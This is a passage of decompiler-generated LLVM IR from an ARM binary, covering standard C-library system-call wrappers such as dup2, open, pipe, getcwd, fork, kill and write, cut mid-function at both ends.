  uselistorder i32 %v1_f3fc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_f400, { 1, 2, 0, 3 }
  uselistorder i32 %v4_f3ec, { 1, 0 }
  uselistorder i32 %v4_f3e8, { 2, 1, 0 }
  uselistorder i32 %v1_f3ec, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_f3f4.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_f3c0, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_f3c0, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_f3b4, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_f44c, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_f408, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f3f4thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_f4b4 = udiv i32 %arg1, %arg2
  ret i32 %v2_f4b4
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_f4d0 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_f4d0
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_f4f0 = load i32, i32* @r0, align 4
  %v2_f4f0 = icmp ugt i32 %v0_f4f0, -4097
  br i1 %v2_f4f0, label %bb1, label %bb

bb:                                               ; preds = %entry
  ret i32 %v0_f4f0

bb1:                                              ; preds = %entry
  %v4_f4fc = icmp eq i32 %v0_f4f0, -38
  br i1 %v4_f4fc, label %dec_label_pc_f504, label %bb2

dec_label_pc_f504:                                ; preds = %bb1
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_f504, %bb1
  %v0_f51c = call i32 @__syscall_error()
  ret i32 %v0_f51c
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f520 = load i32, i32* @r7, align 4
  store i32 %v3_f520, i32* %stack_var_-8, align 4
  %v0_f52c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f52c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f52c, -4095
  br i1 %tmp, label %dec_label_pc_f54c, label %dec_label_pc_f53c

dec_label_pc_f53c:                                ; preds = %entry
  %v0_f53c = call i32 @__GI___errno_location()
  %v0_f540 = load i32, i32* %r7.global-to-local, align 4
  %v1_f540 = sub i32 0, %v0_f540
  %v2_f544 = inttoptr i32 %v0_f53c to i32*
  store i32 %v1_f540, i32* %v2_f544, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_f54c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f54c

dec_label_pc_f54c:                                ; preds = %entry, %dec_label_pc_f53c
  %v1_f550 = phi i32 [ %v0_f52c, %entry ], [ -1, %dec_label_pc_f53c ]
  %v2_f54c = phi i32 [ %v3_f520, %entry ], [ %v2_f54c.pre, %dec_label_pc_f53c ]
  store i32 %v2_f54c, i32* @r7, align 4
  ret i32 %v1_f550

; uselistorder directives
  uselistorder i32 %v0_f52c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f54c, { 1, 0 }
}

define i32 @__GI_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v6_f554 = load i32, i32* @r2, align 4
  %v9_f554 = load i32, i32* @r3, align 4
  store i32 %v9_f554, i32* %stack_var_-4, align 4
  %v1_f564 = and i32 %arg2, 64
  %v2_f564 = icmp eq i32 %v1_f564, 0
  br i1 %v2_f564, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v3_f56c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v3_f56c, i32* @r3, align 4
  %phitmp = urem i32 %v6_f554, 65536
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v0_f570 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_f570, i32* @r2, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f5a0, label %dec_label_pc_f590

dec_label_pc_f590:                                ; preds = %.thread
  %v0_f590 = call i32 @__GI___errno_location()
  %v0_f594 = load i32, i32* %r7.global-to-local, align 4
  %v1_f594 = sub i32 0, %v0_f594
  store i32 %v1_f594, i32* @r3, align 4
  %v2_f598 = inttoptr i32 %v0_f590 to i32*
  store i32 %v1_f594, i32* %v2_f598, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f5a0

dec_label_pc_f5a0:                                ; preds = %.thread, %dec_label_pc_f590
  %v0_f5a0 = phi i32 [ %arg1, %.thread ], [ -1, %dec_label_pc_f590 ]
  ret i32 %v0_f5a0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f5a0, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f5b4 = load i32, i32* @r7, align 4
  store i32 %v3_f5b4, i32* %stack_var_-8, align 4
  %v0_f5c0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f5c0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f5c0, -4095
  br i1 %tmp, label %dec_label_pc_f5e0, label %dec_label_pc_f5d0

dec_label_pc_f5d0:                                ; preds = %entry
  %v0_f5d0 = call i32 @__GI___errno_location()
  %v0_f5d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_f5d4 = sub i32 0, %v0_f5d4
  %v2_f5d8 = inttoptr i32 %v0_f5d0 to i32*
  store i32 %v1_f5d4, i32* %v2_f5d8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_f5e0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f5e0

dec_label_pc_f5e0:                                ; preds = %entry, %dec_label_pc_f5d0
  %v1_f5e4 = phi i32 [ %v0_f5c0, %entry ], [ -1, %dec_label_pc_f5d0 ]
  %v2_f5e0 = phi i32 [ %v3_f5b4, %entry ], [ %v2_f5e0.pre, %dec_label_pc_f5d0 ]
  store i32 %v2_f5e0, i32* @r7, align 4
  ret i32 %v1_f5e4

; uselistorder directives
  uselistorder i32 %v0_f5c0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f5e0, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_f5e8 = load i32, i32* @r4, align 4
  %v6_f5e8 = load i32, i32* @r5, align 4
  %v9_f5e8 = load i32, i32* @r6, align 4
  %v12_f5e8 = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  %v2_f5ec = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r4, align 4
  %v2_f5fc = icmp eq i32 %arg1, 0
  br i1 %v2_f5ec, label %dec_label_pc_f5fc, label %dec_label_pc_f62c

dec_label_pc_f5fc:                                ; preds = %entry
  br i1 %v2_f5fc, label %dec_label_pc_f618, label %dec_label_pc_f604

dec_label_pc_f604:                                ; preds = %dec_label_pc_f5fc
  %v0_f604 = call i32 @__GI___errno_location()
  %v0_f608 = load i32, i32* @r6, align 4
  store i32 %v0_f608, i32* @r4, align 4
  %v2_f610 = inttoptr i32 %v0_f604 to i32*
  store i32 22, i32* %v2_f610, align 4
  br label %dec_label_pc_f6c4

dec_label_pc_f618:                                ; preds = %dec_label_pc_f5fc
  %v0_f618 = call i32 @__GI_getpagesize()
  %v5_f620 = icmp slt i32 %v0_f618, 4096
  br i1 %v5_f620, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_f618
  store i32 %v0_f618, i32* @r7, align 4
  br label %dec_label_pc_f63c

bb16:                                             ; preds = %dec_label_pc_f618
  store i32 4096, i32* @r7, align 4
  br label %dec_label_pc_f63c

dec_label_pc_f62c:                                ; preds = %entry
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_f5fc, label %dec_label_pc_f63c, label %bb17

bb17:                                             ; preds = %dec_label_pc_f62c
  br label %dec_label_pc_f650

dec_label_pc_f63c:                                ; preds = %dec_label_pc_f62c, %bb, %bb16
  %v0_f63c = phi i32 [ %v0_f618, %bb ], [ 4096, %bb16 ], [ %arg2, %dec_label_pc_f62c ]
  %v1_f640 = call i32 @malloc(i32 %v0_f63c)
  %v2_f644 = icmp eq i32 %v1_f640, 0
  br i1 %v2_f644, label %dec_label_pc_f6c0, label %dec_label_pc_f64c

dec_label_pc_f64c:                                ; preds = %dec_label_pc_f63c
  br label %dec_label_pc_f650

dec_label_pc_f650:                                ; preds = %bb17, %dec_label_pc_f64c
  %storemerge = phi i32 [ %arg1, %bb17 ], [ %v1_f640, %dec_label_pc_f64c ]
  %v0_f694 = phi i32 [ %arg1, %bb17 ], [ %v1_f640, %dec_label_pc_f64c ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 %v0_f694, i32* @r7, align 4
  %tmp = icmp ult i32 %v0_f694, -4095
  br i1 %tmp, label %dec_label_pc_f67c, label %dec_label_pc_f66c

dec_label_pc_f66c:                                ; preds = %dec_label_pc_f650
  %v0_f66c = call i32 @__GI___errno_location()
  %v0_f670 = load i32, i32* @r7, align 4
  %v1_f670 = sub i32 0, %v0_f670
  %v2_f674 = inttoptr i32 %v0_f66c to i32*
  store i32 %v1_f670, i32* %v2_f674, align 4
  br label %dec_label_pc_f6ac

dec_label_pc_f67c:                                ; preds = %dec_label_pc_f650
  %v1_f67c = icmp slt i32 %v0_f694, 0
  br i1 %v1_f67c, label %dec_label_pc_f6ac, label %dec_label_pc_f684

dec_label_pc_f684:                                ; preds = %dec_label_pc_f67c
  %v0_f684 = load i32, i32* @r4, align 4
  %v2_f684 = icmp eq i32 %v0_f684, 0
  br i1 %v2_f684, label %bb18, label %dec_label_pc_f6a0.thread7

dec_label_pc_f6a0.thread7:                        ; preds = %dec_label_pc_f684
  br label %dec_label_pc_f6c4

bb18:                                             ; preds = %dec_label_pc_f684
  %v1_f688 = load i32, i32* @r6, align 4
  %v3_f688 = icmp eq i32 %v1_f688, 0
  br i1 %v3_f688, label %dec_label_pc_f6a0, label %dec_label_pc_f6a0.thread

dec_label_pc_f6a0.thread:                         ; preds = %bb18
  br label %bb19

dec_label_pc_f6a0:                                ; preds = %bb18
  %v2_f698 = inttoptr i32 %v0_f694 to i32*
  %v3_f698 = call i32 @realloc(i32* %v2_f698, i32 %v0_f694)
  store i32 %v3_f698, i32* @r4, align 4
  %v2_f6a0 = icmp eq i32 %v3_f698, 0
  br i1 %v2_f6a0, label %dec_label_pc_f6a0.bb19_crit_edge, label %dec_label_pc_f6c4

dec_label_pc_f6a0.bb19_crit_edge:                 ; preds = %dec_label_pc_f6a0
  %v1_f6a4.pre = load i32, i32* @r5, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_f6a0.bb19_crit_edge, %dec_label_pc_f6a0.thread
  %v1_f6a4 = phi i32 [ %v1_f6a4.pre, %dec_label_pc_f6a0.bb19_crit_edge ], [ %v0_f694, %dec_label_pc_f6a0.thread ]
  store i32 %v1_f6a4, i32* @r4, align 4
  br label %dec_label_pc_f6c4

dec_label_pc_f6ac:                                ; preds = %dec_label_pc_f67c, %dec_label_pc_f66c
  %v0_f6ac = load i32, i32* @r4, align 4
  %v2_f6ac = icmp eq i32 %v0_f6ac, 0
  br i1 %v2_f6ac, label %dec_label_pc_f6b4, label %dec_label_pc_f6c0

dec_label_pc_f6b4:                                ; preds = %dec_label_pc_f6ac
  %v0_f6b4 = load i32, i32* @r5, align 4
  store i32 %v0_f6b4, i32* @r0, align 4
  %v0_f6b8 = call i32 @free()
  br label %dec_label_pc_f6c4

dec_label_pc_f6c0:                                ; preds = %dec_label_pc_f6ac, %dec_label_pc_f63c
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_f6c4

dec_label_pc_f6c4:                                ; preds = %dec_label_pc_f6a0.thread7, %bb19, %dec_label_pc_f6a0, %dec_label_pc_f6b4, %dec_label_pc_f604, %dec_label_pc_f6c0
  %v0_f6c4 = load i32, i32* @r4, align 4
  store i32 %v3_f5e8, i32* @r4, align 4
  store i32 %v6_f5e8, i32* @r5, align 4
  store i32 %v9_f5e8, i32* @r6, align 4
  store i32 %v12_f5e8, i32* @r7, align 4
  ret i32 %v0_f6c4

; uselistorder directives
  uselistorder i32 %v0_f694, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v1_f640, { 1, 0, 2 }
  uselistorder i32 %v0_f618, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_f6c4, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_f650, { 1, 0 }
  uselistorder label %dec_label_pc_f63c, { 0, 2, 1 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_f6e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 96) to i32*), align 4
  %v1_f6e4 = inttoptr i32 %v4_f6e0 to i32*
  %v2_f6e4 = load i32, i32* %v1_f6e4, align 4
  %v2_f6e8 = icmp eq i32 %v2_f6e4, 0
  br i1 %v2_f6e8, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_f6f0 = phi i32 [ %v2_f6e4, %entry ], [ 4096, %bb ]
  ret i32 %v1_f6f0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_getpid() local_unnamed_addr {
entry:
  %v1_f70c = load i32, i32* @r0, align 4
  ret i32 %v1_f70c
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_f714 = ptrtoint i32* %stack_var_-16 to i32
  %v2_f724 = call i32 @gettimeofday(i32 %v2_f714, i32 0)
  %v2_f728 = load i32, i32* %stack_var_-16, align 4
  %v2_f72c = icmp eq i32* %arg1, null
  br i1 %v2_f72c, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_f728, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_f728

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f774, label %dec_label_pc_f764

dec_label_pc_f764:                                ; preds = %entry
  %v0_f764 = call i32 @__GI___errno_location()
  %v0_f768 = load i32, i32* %r4.global-to-local, align 4
  %v1_f768 = sub i32 0, %v0_f768
  %v2_f76c = inttoptr i32 %v0_f764 to i32*
  store i32 %v1_f768, i32* %v2_f76c, align 4
  br label %dec_label_pc_f774

dec_label_pc_f774:                                ; preds = %entry, %dec_label_pc_f764
  %v1_f77c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_f764 ]
  ret i32 %v1_f77c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f774, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f780 = load i32, i32* @r7, align 4
  store i32 %v3_f780, i32* %stack_var_-8, align 4
  %v0_f78c = load i32, i32* @r0, align 4
  store i32 %v0_f78c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f78c, -4095
  br i1 %tmp, label %dec_label_pc_f7ac, label %dec_label_pc_f79c

dec_label_pc_f79c:                                ; preds = %entry
  %v0_f79c = call i32 @__GI___errno_location()
  %v0_f7a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_f7a0 = sub i32 0, %v0_f7a0
  %v2_f7a4 = inttoptr i32 %v0_f79c to i32*
  store i32 %v1_f7a0, i32* %v2_f7a4, align 4
  %v2_f7ac.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f7ac

dec_label_pc_f7ac:                                ; preds = %entry, %dec_label_pc_f79c
  %v1_f7b0 = phi i32 [ %v0_f78c, %entry ], [ -1, %dec_label_pc_f79c ]
  %v2_f7ac = phi i32 [ %v3_f780, %entry ], [ %v2_f7ac.pre, %dec_label_pc_f79c ]
  store i32 %v2_f7ac, i32* @r7, align 4
  ret i32 %v1_f7b0

; uselistorder directives
  uselistorder i32 %v0_f78c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f7ac, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_f7c0 = call i32 @wait4()
  ret i32 %v0_f7c0
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f800, label %dec_label_pc_f7f0

dec_label_pc_f7f0:                                ; preds = %entry
  %v0_f7f0 = call i32 @__GI___errno_location()
  %v0_f7f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_f7f4 = sub i32 0, %v0_f7f4
  %v2_f7f8 = inttoptr i32 %v0_f7f0 to i32*
  store i32 %v1_f7f4, i32* %v2_f7f8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f800

dec_label_pc_f800:                                ; preds = %entry, %dec_label_pc_f7f0
  %v0_f800 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_f7f0 ]
  ret i32 %v0_f800

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f800, { 1, 0 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f810 = load i32, i32* @r7, align 4
  store i32 %v3_f810, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f838, label %dec_label_pc_f828

dec_label_pc_f828:                                ; preds = %entry
  %v0_f828 = call i32 @__GI___errno_location()
  %v0_f82c = load i32, i32* %r7.global-to-local, align 4
  %v1_f82c = sub i32 0, %v0_f82c
  %v2_f830 = inttoptr i32 %v0_f828 to i32*
  store i32 %v1_f82c, i32* %v2_f830, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_f83c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f838

dec_label_pc_f838:                                ; preds = %entry, %dec_label_pc_f828
  %v2_f83c = phi i32 [ %v3_f810, %entry ], [ %v2_f83c.pre, %dec_label_pc_f828 ]
  %v0_f838 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_f828 ]
  store i32 %v2_f83c, i32* @r7, align 4
  ret i32 %v0_f838

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f838, { 1, 0 }
}

define i32 @__GI_read(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f844 = load i32, i32* @r7, align 4
  store i32 %v3_f844, i32* %stack_var_-8, align 4
  %v0_f850 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f850, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f850, -4095
  br i1 %tmp, label %dec_label_pc_f870, label %dec_label_pc_f860

dec_label_pc_f860:                                ; preds = %entry
  %v0_f860 = call i32 @__GI___errno_location()
  %v0_f864 = load i32, i32* %r7.global-to-local, align 4
  %v1_f864 = sub i32 0, %v0_f864
  %v2_f868 = inttoptr i32 %v0_f860 to i32*
  store i32 %v1_f864, i32* %v2_f868, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_f870.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f870

dec_label_pc_f870:                                ; preds = %entry, %dec_label_pc_f860
  %v1_f874 = phi i32 [ %v0_f850, %entry ], [ -1, %dec_label_pc_f860 ]
  %v2_f870 = phi i32 [ %v3_f844, %entry ], [ %v2_f870.pre, %dec_label_pc_f860 ]
  store i32 %v2_f870, i32* @r7, align 4
  ret i32 %v1_f874

; uselistorder directives
  uselistorder i32 %v0_f850, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f870, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_f87c = ptrtoint i32* %stack_var_-16 to i32
  %v2_f888 = call i32 @getrlimit(i32 7, i32 %v2_f87c)
  %v1_f88c = icmp slt i32 %v2_f888, 0
  %v5_f890 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_f88c, i32 256, i32 %v5_f890
  ret i32 %storemerge
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f8a4 = load i32, i32* @r7, align 4
  store i32 %v3_f8a4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f8cc, label %dec_label_pc_f8bc

dec_label_pc_f8bc:                                ; preds = %entry
  %v0_f8bc = call i32 @__GI___errno_location()
  %v0_f8c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_f8c0 = sub i32 0, %v0_f8c0
  %v2_f8c4 = inttoptr i32 %v0_f8bc to i32*
  store i32 %v1_f8c0, i32* %v2_f8c4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_f8d0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f8cc

dec_label_pc_f8cc:                                ; preds = %entry, %dec_label_pc_f8bc
  %v2_f8d0 = phi i32 [ %v3_f8a4, %entry ], [ %v2_f8d0.pre, %dec_label_pc_f8bc ]
  %v0_f8cc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_f8bc ]
  store i32 %v2_f8d0, i32* @r7, align 4
  ret i32 %v0_f8cc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f8cc, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f8d8 = load i32, i32* @r7, align 4
  store i32 %v3_f8d8, i32* %stack_var_-8, align 4
  %v0_f8e4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f8e4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f8e4, -4095
  br i1 %tmp, label %dec_label_pc_f904, label %dec_label_pc_f8f4

dec_label_pc_f8f4:                                ; preds = %entry
  %v0_f8f4 = call i32 @__GI___errno_location()
  %v0_f8f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_f8f8 = sub i32 0, %v0_f8f8
  %v2_f8fc = inttoptr i32 %v0_f8f4 to i32*
  store i32 %v1_f8f8, i32* %v2_f8fc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_f904.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f904

dec_label_pc_f904:                                ; preds = %entry, %dec_label_pc_f8f4
  %v1_f908 = phi i32 [ %v0_f8e4, %entry ], [ -1, %dec_label_pc_f8f4 ]
  %v2_f904 = phi i32 [ %v3_f8d8, %entry ], [ %v2_f904.pre, %dec_label_pc_f8f4 ]
  store i32 %v2_f904, i32* @r7, align 4
  ret i32 %v1_f908

; uselistorder directives
  uselistorder i32 %v0_f8e4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f904, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_f948 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f948, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f948, -4095
  br i1 %tmp, label %dec_label_pc_f968, label %dec_label_pc_f958

dec_label_pc_f958:                                ; preds = %entry
  %v0_f958 = call i32 @__GI___errno_location()
  %v0_f95c = load i32, i32* %r7.global-to-local, align 4
  %v1_f95c = sub i32 0, %v0_f95c
  %v2_f960 = inttoptr i32 %v0_f958 to i32*
  store i32 %v1_f95c, i32* %v2_f960, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f968

dec_label_pc_f968:                                ; preds = %entry, %dec_label_pc_f958
  %v1_f974 = phi i32 [ %v0_f948, %entry ], [ -1, %dec_label_pc_f958 ]
  ret i32 %v1_f974

; uselistorder directives
  uselistorder i32 %v0_f948, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f968, { 1, 0 }
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_f9b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f9b4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f9b4, -4095
  br i1 %tmp, label %dec_label_pc_f9d4, label %dec_label_pc_f9c4

dec_label_pc_f9c4:                                ; preds = %entry
  %v0_f9c4 = call i32 @__GI___errno_location()
  %v0_f9c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_f9c8 = sub i32 0, %v0_f9c8
  %v2_f9cc = inttoptr i32 %v0_f9c4 to i32*
  store i32 %v1_f9c8, i32* %v2_f9cc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f9d4

dec_label_pc_f9d4:                                ; preds = %entry, %dec_label_pc_f9c4
  %v1_f9e0 = phi i32 [ %v0_f9b4, %entry ], [ -1, %dec_label_pc_f9c4 ]
  ret i32 %v1_f9e0

; uselistorder directives
  uselistorder i32 %v0_f9b4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f9d4, { 1, 0 }
}

define i32 @__GI_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f9e4 = load i32, i32* @r7, align 4
  store i32 %v3_f9e4, i32* %stack_var_-8, align 4
  %v0_f9f0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f9f0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f9f0, -4095
  br i1 %tmp, label %dec_label_pc_fa10, label %dec_label_pc_fa00

dec_label_pc_fa00:                                ; preds = %entry
  %v0_fa00 = call i32 @__GI___errno_location()
  %v0_fa04 = load i32, i32* %r7.global-to-local, align 4
  %v1_fa04 = sub i32 0, %v0_fa04
  %v2_fa08 = inttoptr i32 %v0_fa00 to i32*
  store i32 %v1_fa04, i32* %v2_fa08, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_fa10.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_fa10

dec_label_pc_fa10:                                ; preds = %entry, %dec_label_pc_fa00
  %v1_fa14 = phi i32 [ %v0_f9f0, %entry ], [ -1, %dec_label_pc_fa00 ]
  %v2_fa10 = phi i32 [ %v3_f9e4, %entry ], [ %v2_fa10.pre, %dec_label_pc_fa00 ]
  store i32 %v2_fa10, i32* @r7, align 4
